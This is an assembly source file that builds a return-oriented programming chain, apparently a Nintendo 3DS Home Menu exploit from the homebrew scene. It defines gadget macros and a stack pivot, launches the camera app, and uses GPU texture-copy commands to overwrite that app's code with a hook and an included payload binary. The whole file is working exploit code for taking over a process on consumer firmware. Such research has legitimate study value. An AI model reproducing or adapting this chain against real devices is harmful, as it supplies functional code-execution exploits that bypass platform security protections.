.nds

.include "../build/constants.s"

.create "menu_ropbin.bin",0x0

MENU_OBJECT_LOC equ MENU_LOADEDROP_BUFADR

MENU_STACK_PIVOT equ ROP_MENU_STACK_PIVOT ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ ROP_MENU_POP_PC ; pop {pc}
MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
MENU_CONNECTTOPORT equ ROP_MENU_CONNECTTOPORT

MENU_NSS_LAUNCHTITLE equ ROP_MENU_NSS_LAUNCHTITLE ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
MENU_GSPGPU_RELEASERIGHT equ ROP_MENU_GSPGPU_RELEASERIGHT ; r0 : handle addr
MENU_GSPGPU_FLUSHDATACACHE equ ROP_MENU_GSPGPU_FLUSHDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
MENU_GSPGPU_GXTRYENQUEUE equ ROP_MENU_GSPGPU_GXTRYENQUEUE ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
MENU_MEMCPY equ ROP_MENU_MEMCPY ; r0 : dst, r1 : src, r2 : size

APP_START_LINEAR equ (0x30000000 + FIRM_APPMEMALLOC - 0x00300000)

GPU_REG_BASE equ 0x1EB00000

DUMMY_PTR equ (MENU_OBJECT_LOC - 4)

.macro set_lr,_lr
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NOP ; pop {pc}
	.word ROP_MENU_POP_R4LR_BX_R0 ; pop {r4, lr} ; bx r0
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro nss_launch_title,tidlow,tidhigh
	set_lr ROP_MENU_POP_R4PC ; pop {r4, pc}
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word tidlow ; r2 (tid low) 
		.word tidhigh ; r3 (tid high)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_NSS_LAUNCHTITLE
		.word 0x00000001 ; sp_0 (flag)
.endmacro

.macro memcpy_r0_lr,src,size
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word src ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_MEMCPY
.endmacro

; this memcpy's the size bytes that immediately preceed its call
.macro memcpy_r0_lr_prev,size
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word (MENU_OBJECT_LOC + (. - 4 - size) - object) ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_MEMCPY
.endmacro

.macro memcpy,dst,src,size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word dst ; r0 (out ptr)
	memcpy_r0_lr
.endmacro

.macro apt_open_session,skip
	set_lr MENU_NOP
	.if skip != 0
		skip_0x84
	.endif
	.word ROP_MENU_APT_OPENSESSION
.endmacro

.macro apt_close_session,skip
	set_lr MENU_NOP
	.if skip != 0
		skip_0x84
	.endif
	.word ROP_MENU_APT_CLOSESESSION
.endmacro

.macro apt_send_parameter,dst_id,buffer_ptr,buffer_size,handle_ptr
	; first dereference handle_ptr
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word handle_ptr ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
		.word MENU_LOADEDROP_BUFADR + @@handle_loc ; r4 (destination address)
	.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word 0x101 ; r0 (source app_id)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word dst_id ; r1 (destination app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000001 ; r2 (signal type)
		.word buffer_ptr ; r3 (parameter buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_SENDPARAMETER
		.word buffer_size ; arg_0 (parameter buffer size) (r4 (garbage))
		@@handle_loc:
		.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
.endmacro

.macro apt_glance_parameter,app_id,buffer_ptr,buffer_size,out_handle_ptr,skip
	; first dereference handle_ptr
	set_lr ROP_MENU_POP_R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word app_id ; r1 (app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word DUMMY_PTR ; r2 (signal out ptr)
		.word DUMMY_PTR ; r3 (out buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	.word ROP_MENU_APT_GLANCEPARAMETER
		.word 0x00000000 ; arg_0 (out buffer size) (r4 (garbage))
		.word DUMMY_PTR ; arg_4 (actual size out ptr) (r5 (garbage))
		.word DUMMY_PTR ; arg_8 (handle out ptr) (r6 (garbage))
.endmacro

.macro skip_0x84
	.word ROP_MENU_ADD_SPSPx64_POP_R4RR11PC
		.fill 0x84, 0xDA
.endmacro

.macro wait_for_parameter,app_id
	@@loop_start:
	sleep 100*1000, 0x00000000
	apt_open_session 1
	apt_glance_parameter app_id, DUMMY_PTR, 0x0, DUMMY_PTR, 1
	apt_close_session 1
	; compare to 0x0 value
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0x00000000
	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	; overwrite stack pivot with NOP if equal
	.word ROP_MENU_POP_R4PC
		.word MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word MENU_OBJECT_LOC + @@loop_pivot - 0x4
	.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
	@@loop_pivot:
	.word ROP_MENU_STACK_PIVOT
	.word ROP_MENU_POP_R4R5PC
	@@pivot_data:
		.word MENU_OBJECT_LOC + @@loop_start ; sp
		.word MENU_NOP ; pc
.endmacro

.macro gsp_release_right
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
	.word MENU_GSPGPU_RELEASERIGHT
.endmacro

.macro flush_dcache,addr,size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_FLUSHDATACACHE
.endmacro

.macro send_gx_cmd,cmd_data
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word cmd_data ; r1 (cmd addr)
	.word MENU_GSPGPU_GXTRYENQUEUE
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word MENU_SLEEP
.endmacro

.macro infloop
	set_lr ROP_MENU_BX_LR ; bx lr
	.word ROP_MENU_BX_LR ; bx lr
.endmacro

.orga 0x0

	object:
	rop: ; real ROP starts here

		; send app parameter
			apt_open_session 0
			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR, 0x20, MENU_FS_HANDLE
			apt_close_session 0

		; launch app that we want to takeover
			; nss_launch_title 0x00020400, 0x00040010 ; launch camera app (jpn)
			; nss_launch_title 0x00021400, 0x00040010 ; launch camera app (us)
			nss_launch_title 0x00022400, 0x00040010 ; launch camera app (eu)

		; takeover app
			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppCode - object

		; sleep for a bit
			sleep 200*1000*1000, 0x00000000

		; release gsp rights
			gsp_release_right

			wait_for_parameter 0x101

			sleep 500*1000*1000, 0x00000000

			apt_open_session 0
			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR, 0x20, MENU_NSS_HANDLE
			apt_close_session 0

		; sleep for ever and ever
			sleep 0xffffffff, 0x0fffffff

		; infinite loop just in case
			infloop

		; crash
			.word 0xDEADBABE

	; copy hook code over app .text
	.align 0x4
	gxCommandAppHook:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word MENU_OBJECT_LOC + appHook - object ; source address
		.word APP_START_LINEAR + 0x00104be0 - 0x00100000 ; destination address (PA for 0x00104be0)
		.word 0x00000200 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	gxCommandAppCode:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word MENU_OBJECT_LOC + appCode - object ; source address
		.word APP_START_LINEAR + 0x00200000 - 0x00100000 ; destination address (PA for 0x00200000)
		.word 0x00010000 ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	.align 0x20
	appHook:
		.arm
			ldr r0, =500*1000*1000 ; 1000ms
			ldr r1, =0x00000000
			.word 0xef00000a ; svcSleepThread
			ldr r2, =0x00100000 + 0x00100000
			blx r2
			
		.pool

		.fill ((appHook + 0x200) - .), 0xDA

	appCode:
		.incbin "app_code.bin"

.Close
